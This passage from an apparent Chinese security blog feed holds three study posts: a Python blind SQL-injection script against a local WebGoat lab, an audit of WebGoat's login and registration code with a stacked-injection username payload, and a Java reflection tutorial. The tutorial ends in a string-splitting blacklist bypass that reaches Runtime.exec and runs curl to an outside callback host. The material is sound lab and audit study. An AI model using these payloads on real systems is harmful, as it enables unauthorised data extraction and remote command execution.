class="line">&#125;</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">proxy=&#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8081&quot;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    temp = result</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        vul_url = <span class="string">&quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;%20from%20servers%20where%20hostname=&#x27;webgoat-prd&#x27;)%20then%20hostname%20else%20mac%20end&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)</span><br><span class="line">        <span class="comment"># print(resp.json())</span></span><br><span class="line">        // json解析获取hostname的值，根据hostname排序时，第一个值为webgoat-acc</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;webgoat-acc&#x27;</span> <span class="keyword">in</span> resp.json()[<span class="number">0</span>][<span class="string">&#x27;hostname&#x27;</span>]:</span><br><span class="line">            result += char</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">if</span> temp == result:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webgoat </tag>
            
            <tag> webgoat 登录注册模块审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.登录注册模块审计</title>
      <link href="/2020/07/05/2.%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/"/>
      <url>/2020/07/05/2.%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="1-登录功能"><a href="#1-登录功能" class="headerlink" title="1.登录功能"></a>1.登录功能</h1><h2 id="1-1-根据路由查找实现代码"><a href="#1-1-根据路由查找实现代码" class="headerlink" title="1.1.根据路由查找实现代码"></a>1.1.根据路由查找实现代码</h2><p>登录接口为：/WebGoat/login</p><p>全局搜索/login查看相关代码：</p><p><img src="1.1.1.png" alt="1.1"></p><p>定位到webgoat/WebSecurityConfig.java</p><p>可以看出该项目使用的是springSecurity框架，框架关键配置如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ExpressionUrlAuthorizationConfigurer&lt;HttpSecurity&gt;.ExpressionInterceptUrlRegistry security = http</span><br><span class="line"><span class="comment">//                http.authorizeRequests()其中这里的意思是指通过authorizeRequests()方法来开始请求权限配置。</span></span><br><span class="line">                .authorizeRequests()</span><br><span class="line">                <span class="comment">//我们指定任何用户都可以访问多个URL的模式。</span></span><br><span class="line">                <span class="comment">//任何用户都可以访问以&quot;/css/**&quot;,&quot;/images/**&quot;, 或者 &quot;/js/**...&quot;开头的URL。</span></span><br><span class="line">                .antMatchers(<span class="string">&quot;/css/**&quot;</span>, <span class="string">&quot;/images/**&quot;</span>, <span class="string">&quot;/js/**&quot;</span>, <span class="string">&quot;fonts/**&quot;</span>, <span class="string">&quot;/plugins/**&quot;</span>, <span class="string">&quot;/registration&quot;</span>, <span class="string">&quot;/register.mvc&quot;</span>).permitAll()</span><br><span class="line"><span class="comment">//               .anyRequest().authenticated()是对http所有的请求必须通过授权认证才可以访问。</span></span><br><span class="line">                .anyRequest().authenticated();</span><br><span class="line">        security.and()</span><br><span class="line">                <span class="comment">//通过formlogin方法登录，并设置登录url为/login</span></span><br><span class="line">                .formLogin()</span><br><span class="line">                .loginPage(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"><span class="comment">//               登录成功后跳转到//welcome.mvc页面</span></span><br><span class="line">                .defaultSuccessUrl(<span class="string">&quot;/welcome.mvc&quot;</span>, <span class="keyword">true</span>)</span><br><span class="line">                .usernameParameter(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">                .passwordParameter(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">                .permitAll();</span><br><span class="line">        security.and()</span><br><span class="line"><span class="comment">//                登出之后删除cookie，使session无效</span></span><br><span class="line">                .logout().deleteCookies(<span class="string">&quot;JSESSIONID&quot;</span>).invalidateHttpSession(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//              取消csrf防护，说明该项目大概率存在csrf漏洞</span></span><br><span class="line">        security.and().csrf().disable();</span><br><span class="line"></span><br><span class="line">        http.headers().cacheControl().disable();</span><br><span class="line"><span class="comment">//        ajax身份认证入口点/login</span></span><br><span class="line">        http.exceptionHandling().authenticationEntryPoint(<span class="keyword">new</span> AjaxAuthenticationEntryPoint(<span class="string">&quot;/login&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configureGlobal</span><span class="params">(AuthenticationManagerBuilder auth)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//        从数据库读取用户进行身份验证</span></span><br><span class="line">        auth.userDetailsService(userDetailsService); <span class="comment">//.passwordEncoder(bCryptPasswordEncoder());</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth.userDetailsService(userDetailsService); <span class="comment">//.passwordEncoder(bCryptPasswordEncoder());</span></span><br></pre></td></tr></table></figure><p>从数据库中读取用户进行身份验证：<a href="https://www.jianshu.com/p/c3b79a625d84">https://www.jianshu.com/p/c3b79a625d84</a></p><h2 id="1-2-跟进userDetailsService"><a href="#1-2-跟进userDetailsService" class="headerlink" title="1.2. 跟进userDetailsService"></a>1.2. 跟进userDetailsService</h2><p><img src="1.2.1.png" alt="2.1"></p><p>userDetailsService为UserService的对象。跟进UserService类。</p><p>webgoat-container/src/main/java/org/owasp/webgoat/users/UserRepository.java</p><p><img src="1.2.2.png" alt="2.1"></p><p>UserService继承JpaRepositoy。采用了jpa的方式，继承JpaRepository即可使用数据的增删改查。</p><p>此处的findByUsername，为自定义的简单查询。就是根据方法名来自动生成 SQL</p><p>springboot jpa使用方式讲解：<a href="https://www.cnblogs.com/ityouknow/p/5891443.html">Spring Boot(五)：Spring Boot Jpa 的使用 - 纯洁的微笑 - 博客园 (cnblogs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Spring Boot Jpa 是 Spring 基于 ORM 框架、Jpa 规范的基础上封装的一套 Jpa 应用框架，可使开发者用极简的代码即可实现对数据的访问和操作。它提供了包括增删改查等在内的常用功能，且易于扩展！学习并使用 Spring Data Jpa 可以极大提高开发效率！</span><br><span class="line"></span><br><span class="line">Spring Boot Jpa 让我们解脱了 DAO 层的操作，基本上所有 CRUD 都可以依赖于它来实现</span><br></pre></td></tr></table></figure><h2 id="1-3-跟进WebGoatUser类"><a href="#1-3-跟进WebGoatUser类" class="headerlink" title="1.3.跟进WebGoatUser类"></a>1.3.跟进WebGoatUser类</h2><p>@Entity注解可以确定该类为webgoat的用户实体类。</p><p><img src="1.2.3.png" alt="2.1"></p><h2 id="1-4-sql注入判断"><a href="#1-4-sql注入判断" class="headerlink" title="1.4.sql注入判断"></a>1.4.sql注入判断</h2><p>登录接口设计到了数据库的查询等操作，自然想到了sql注入，但是有没有sql注入呢？</p><p>可以在配置文件中添加打印sql语句配置，在控制台查看输出。</p><p>webwolf/src/main/resources/application-webwolf.properties</p><p>添加：spring.jpa.show-sql=true</p><p><img src="1.4.1.png" alt="4.1"></p><p>可以在test中执行测试用例来打印sql语句</p><p>webgoat-container/src/test/java/org/owasp/webgoat/users/UserRepositoryTest.java</p><p><img src="1.4.2.png" alt="4.2"></p><p>可以看到执行的sql语句采用了预编译。所以此处就杜绝了sql注入。</p><p>关于springDataJpa的注入问题还发现了一篇很好的文章：</p><p><a href="https://sec-in.com/article/547">Java代审之SQL注入—SpringDataJpa-SecIN (sec-in.com)</a></p><p>作者给出了两个全局查找注入的搜索方式：<br>1.order by处无法使用预编译，可以搜索关键字：**<code>JpaSort.unsafe()</code>**</p><p>2.再一些复杂的业务场景中，自定义的sql无法满足业务需求，需要自己编写sql语句，此时就可能存在拼接sql语句，存在sql注入的风险。</p><p>可直接<strong>检索EntityManager</strong>的相关使用。</p><h1 id="2-注册功能"><a href="#2-注册功能" class="headerlink" title="2.注册功能"></a>2.注册功能</h1><h2 id="2-1全局搜索注册路由-register"><a href="#2-1全局搜索注册路由-register" class="headerlink" title="2.1全局搜索注册路由/register"></a>2.1全局搜索注册路由/register</h2><p>定位到webgoat-container/src/main/java/org/owasp/webgoat/users/RegistrationController.java</p><p><img src="2.1.1.png" alt="2.1.1"></p><p>/registration路由会进入registration.html页面。</p><p><img src="2.1.2.png" alt="2.1.2"></p><p>registration页面的输入会提交到register.mvc路由。</p><h2 id="2-2-输入验证"><a href="#2-2-输入验证" class="headerlink" title="2.2 输入验证"></a>2.2 输入验证</h2><p>输入的用户名和密码会进入webgoat-container/src/main/java/org/owasp/webgoat/users/UserValidator.java</p><p><img src="2.2.1.png" alt="2.2.1"></p><p>判断输入用户名数据库中是否存在。第一次和第二次输入的密码是否相同。符合规则则进入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userService.addUser(userForm.getUsername(), userForm.getPassword());</span><br></pre></td></tr></table></figure><h2 id="2-3添加用户到数据库"><a href="#2-3添加用户到数据库" class="headerlink" title="2.3添加用户到数据库"></a>2.3添加用户到数据库</h2><p>addUser():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">(String username, String password)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//get user if there exists one by the name</span></span><br><span class="line">        <span class="keyword">var</span> userAlreadyExists = userRepository.existsByUsername(username);</span><br><span class="line">      <span class="comment">// 保存用户密码。jpa内置函数此处相当执行sql语句，update </span></span><br><span class="line">        <span class="keyword">var</span> webGoatUser = userRepository.save(<span class="keyword">new</span> WebGoatUser(username, password));</span><br><span class="line"><span class="comment">//用户在数据库中不存在则进入</span></span><br><span class="line">        <span class="keyword">if</span> (!userAlreadyExists) &#123;</span><br><span class="line">          <span class="comment">//保存用户到数据库</span></span><br><span class="line">            userTrackerRepository.save(<span class="keyword">new</span> UserTracker(username)); <span class="comment">//if user previously existed it will not get another tracker</span></span><br><span class="line">          <span class="comment">//通过用户名创建课程</span></span><br><span class="line">            createLessonsForUser(webGoatUser);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>createLessonsForUser():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">createLessonsForUser</span><span class="params">(WebGoatUser webGoatUser)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//此处进行sql语句拼接</span></span><br><span class="line">    jdbcTemplate.execute(<span class="string">&quot;CREATE SCHEMA \&quot;&quot;</span> + webGoatUser.getUsername() + <span class="string">&quot;\&quot; authorization dba&quot;</span>);</span><br><span class="line">    flywayLessons.apply(webGoatUser.getUsername()).migrate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处的sql语句可以构造用户名payload，进行堆叠注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test;<span class="function">select <span class="title">sleep</span><span class="params">(<span class="number">5</span>)</span></span>; -- </span><br></pre></td></tr></table></figure><p>但是用户名有限制，只能输入字母和数据，判断正则如下<code>[a-z0-9-]*</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="meta">@Size(min = 6, max = 45)</span></span><br><span class="line">    <span class="meta">@Pattern(regexp = &quot;[a-z0-9-]*&quot;, message = &quot;can only contain lowercase letters, digits, and -&quot;)</span></span><br><span class="line"><span class="comment">//    用户名6-45位，字母数字</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br></pre></td></tr></table></figure><p>暂时没想到绕过方式。</p><h2 id="2-4-sql注入判断"><a href="#2-4-sql注入判断" class="headerlink" title="2.4 sql注入判断"></a>2.4 sql注入判断</h2><p>注册功能的查询，添加，都是用的jpa规范，存在预编译。不存在注入。</p><p>添加用户之后会相应的为用户创造一个数据库，此处存在sql注入的风险，但是用户输入用户名存在限制，只能输入数字和字母。可能存在一定的绕过方式。</p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webgoat </tag>
            
            <tag> webgoat 登录注册模块审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射机制</title>
      <link href="/2020/07/05/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
      <url>/2020/07/05/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-反射原理"><a href="#0x01-反射原理" class="headerlink" title="0x01 反射原理"></a>0x01 反射原理</h2><p>反射中几个极为重要的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取类的⽅法： forName</span><br><span class="line">实例化类对象的⽅法： newInstance</span><br><span class="line">获取函数的⽅法： getMethod</span><br><span class="line">执⾏函数的⽅法： invoke</span><br></pre></td></tr></table></figure><p>方法详解：</p><h3 id="forName"><a href="#forName" class="headerlink" title="forName():"></a>forName():</h3><p><img src="1.1.1.png" alt="1.1.1"></p><p>forName两种使用形式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; forName(String name) </span><br><span class="line"><span class="comment">//name:class名称</span></span><br><span class="line">Class&lt;?&gt; forName(String name, **<span class="keyword">boolean</span>** initialize, ClassLoader loader)</span><br><span class="line"><span class="comment">//name:class名称</span></span><br><span class="line"><span class="comment">//initialize：是否进行“类初始化”</span></span><br><span class="line"><span class="comment">//loader：加载器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一种调用形式等同于第二种，其实就是第二种形式的封装，默认进行&quot;类初始化”，默认加载器根据类名（完整路径）来加载</span></span><br><span class="line">Class.forName(className) </span><br><span class="line">Class.forName(className, <span class="keyword">true</span>, currentLoader)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance():"></a>newInstance():</h3><p><img src="1.1.2.png" alt="1.1.2"></p><p>newInstance()没有参数输入，所以newInstance()只能实例化含有无参构造函数的类。当没有无参构造函数时即会报错：<br><img src="1.1.2.1.png" alt="1.1.2.1"></p><p>实例化类的对象，如将forname()获取到的类方法，实例化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.javaSec.Test&quot;</span>).newInstance()</span><br></pre></td></tr></table></figure><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod():"></a>getMethod():</h3><p><img src="1.1.3.png" alt="1.1.3"></p><p>java中支持者类的重构，不能仅通过函数名来确定一个函数。所以，</p><p>在调用 getMethod 的时候，我们需要传给他你需要调用的函数的<code>参数类型列表</code>，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class)</span><br></pre></td></tr></table></figure><p>exec参数列表：<br><img src="1.1.4.png" alt="1.1.4"></p><p><code>(String cmdarray[])</code>，getMethod()获取的参数类型列表<code>(String name, Class&lt;?&gt;... parameterTypes)</code></p><ul><li>单独的T代表一个类型，而Class<T>和Class&lt;?&gt;代表这个类型所对应的类</li><li>Class<T>在实例化的时候，T要替换成具体类</li><li>Class&lt;?&gt;它是个通配泛型，?可以代表任何类型  </li><li>此处<code>...</code>这种语法表示Class参数数量是可变的。当参数中有多个不同类型的列表时，及需要传入多个参数类型列表。</li></ul><p>因为exec执行的命令为<code>touch test3.txt</code>所以此处应该传入<code>String.class</code>.</p><p>获取函数的方法，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Class.forName(<span class="string">&quot;com.javaSec.Test&quot;</span>).getMethod(<span class="string">&quot;testMethod&quot;</span>));</span><br><span class="line">  </span><br><span class="line">输出：<span class="keyword">public</span> <span class="keyword">void</span> com.javaSec.Test.testMethod()</span><br></pre></td></tr></table></figure><p>在此处，testMethod()无参数列表，则不需要输入参数类型列表。</p><h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke():"></a>invoke():</h3><p>执行函数的方法。</p><p><img src="1.1.5.png" alt="1.1.5"></p><p>第一个参数是执行method的对象，</p><ul><li>如果这个方法是一个普通方法，那么第一个参数是类对象</li><li>如果这个方法是一个静态方法，那么第一个参数是类（之后会提到，这里其实不用那么死板，这个）<br>它接下来的参数才是需要传入的参数。</li></ul><p>由于我们的exec函数是一个普通方法，需要传入类对象，即<code>invoke(类对象，exec方法传入的参数)</code>.</p><p>exec方法为Runtime类方法，所以要传入Runtime类。</p><p>Runtime类源码：</p><p><img src="file://1.1.7.png?lastModify=1615291944" alt="1.1.7"></p><p>Runtime()为私有方法，只能通过公有方发getRuntime()获取。</p><p>所以，Runtime的类对象不能通过newInstance()来实例化对象,是因为Runtime的类构造函数是一个private构造函数，只能通过getRuntime方法返回一个对象。<br>获取类对象：<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))</code> (由于getRuntime是一个静态方法，invoke传入Runtime类，进行调用)<br><code>invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))，&quot;calc.exe&quot;)</code></p><p>那么合成以上的操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),<span class="string">&quot;touch test3.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p>亲测可写文件,再简化一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>); </span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz), <span class="string">&quot;touch test3.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p>以上我们就完成了通过类内置的静态方法获取类的实例，进一步调用一个public方法。</p><p><code>但是假如一个类没有无参构造方法（即不能class.newInstance()），也没有单例模式（只存在一个实例）的静态方法（即不能像getRuntime一样获取实例），那我们该如何实例化这个类呢？</code></p><p>第二个参数是，是需要传入的调用函数的<code>参数列表</code>，…表示数量可控，可以传入多个参数（也正好和函数传入多个参数对应）。如：</p><p><img src="1.1.6.png" alt="1.1.6"></p><p>这里传入的参数为exec函数的参数</p><p>写一些代码来加深理解：</p><p>正常类执行的方式与反射执行的方式一一对应。</p><p><img src="1.1.png" alt="1.1"></p><h3 id="1-获取类的三种方法"><a href="#1-获取类的三种方法" class="headerlink" title="1. 获取类的三种方法"></a>1. 获取类的三种方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1。获取类的三种方法（获取java.lang.Class）对象</span></span><br><span class="line">        <span class="comment">/*1.1正常获取类*/</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> Test().getClass());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*1.2直接获取以加载类的class属性*/</span></span><br><span class="line">        System.out.println(Test.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*1.3forName 获取类*/</span></span><br><span class="line">        System.out.println(Class.forName(<span class="string">&quot;com.javaSec.Test&quot;</span>));</span><br></pre></td></tr></table></figure><p>可以看到反射只需要以<code>参数</code>的形式给出类的完整路径：<code>com.javaSec.Test</code>即可获取到类。</p><h3 id="2-获取类对象方法"><a href="#2-获取类对象方法" class="headerlink" title="2. 获取类对象方法"></a>2. 获取类对象方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  2.获取累的方法</span></span><br><span class="line">        <span class="comment">/*2.1 反射的方式获取类方法*/</span></span><br><span class="line">        System.out.println(Class.forName(<span class="string">&quot;com.javaSec.Test&quot;</span>).getMethod(<span class="string">&quot;testMethod&quot;</span>));</span><br></pre></td></tr></table></figure><h3 id="3-实例化类的对象"><a href="#3-实例化类的对象" class="headerlink" title="3. 实例化类的对象"></a>3. 实例化类的对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  3.实例化类的对象</span></span><br><span class="line">        <span class="comment">/*3.1 反射的方法实例化类的对象*/</span></span><br><span class="line">        System.out.println(Class.forName(<span class="string">&quot;com.javaSec.Test&quot;</span>).newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*3.2 正常实例化类*/</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> Test());</span><br></pre></td></tr></table></figure><h3 id="4-执行函数的方法"><a href="#4-执行函数的方法" class="headerlink" title="4. 执行函数的方法"></a>4. 执行函数的方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  4. 执行函数方法</span></span><br><span class="line">        <span class="comment">/*4.1 反射的方法执行函数*/</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.javaSec.Test&quot;</span>).getMethod(<span class="string">&quot;testMethod&quot;</span>).invoke(Class.forName(<span class="string">&quot;com.javaSec.Test&quot;</span>).newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*4.2 正常执行函数*/</span></span><br><span class="line">        <span class="keyword">new</span> Test().testMethod();</span><br></pre></td></tr></table></figure><h2 id="0x02-反射在java开发中的应用"><a href="#0x02-反射在java开发中的应用" class="headerlink" title="0x02 反射在java开发中的应用"></a>0x02 反射在java开发中的应用</h2><p>JDBC加载数据库驱动就用到了反射:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String JDBC_DRIVER = <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">Class.forName(JDBC_DRIVER);</span><br><span class="line"><span class="comment">//以上也可以直接替换为 new com.mysql.jdbc.Driver();</span></span><br></pre></td></tr></table></figure><p>Class.forName(String className)返回的是一个<strong>类</strong>，在这个过程中，会把该类加载到jvm中，即这个类的<strong>静态代码</strong>会执行，我们主要就是为了要个静态代码块（**<code>java.sql.DriverManager.registerDriver(new Driver());</code>**）执行才加载这个驱动的。为什么不使用new com.mysql.jdbc.Driver()这种方式呢？</p><blockquote><p>如果使用new com.mysql.jdbc.Driver()这种方式，会对这个具体的类产生依赖。后续如果你要更换数据库驱动，就得重新修改代码。而使用反射的方式，只需要在配置文件中，更改相应的驱动和url即可。—-<strong>解耦</strong></p></blockquote><p>—–来自：<a href="https://my.oschina.net/u/4398028/blog/3574308">为什么JDBC中加载驱动要使用反射？</a></p><h2 id="0x03-反射在java安全中的应用"><a href="#0x03-反射在java安全中的应用" class="headerlink" title="0x03 反射在java安全中的应用"></a>0x03 反射在java安全中的应用</h2><p>看p牛的java漫谈中说：<code>在安全研究中，我们使⽤反射的⼀⼤⽬的，就是绕过某些沙盒。</code></p><p>p牛还给出了一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上下⽂中如果只有Integer类型的数字，我们如何获取到可以执⾏命令的Runtime类呢？也许可以这样（伪代</span><br><span class="line">码）： <span class="number">1.</span>getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们来深入理解一下这句话，p牛举了一个ctf类题目。</p><p>其中</p><p><img src="3.1.png" alt="3.1"></p><p>其中存在黑名单过滤了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- java.+lang</span><br><span class="line">- Runtime</span><br><span class="line">- exec.*\(</span><br></pre></td></tr></table></figure><p>通过反射的方式来调用函数，验证payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(String.class.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(String.class.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="string">&quot;curl http://fg5hme.ceye.io/1aa1k&quot;</span>);</span><br></pre></td></tr></table></figure><p>其中forName()传入类路径为字符串参数，此处就可以通过字符串拼接的方式来绕过，黑名单。</p><h2 id="0x04-反射获取私有方法，私有构造函数"><a href="#0x04-反射获取私有方法，私有构造函数" class="headerlink" title="0x04 反射获取私有方法，私有构造函数"></a>0x04 反射获取私有方法，私有构造函数</h2><h3 id="1-没有无参构造函数，没有类似单列模式的静态方法如何反射实例化该类"><a href="#1-没有无参构造函数，没有类似单列模式的静态方法如何反射实例化该类" class="headerlink" 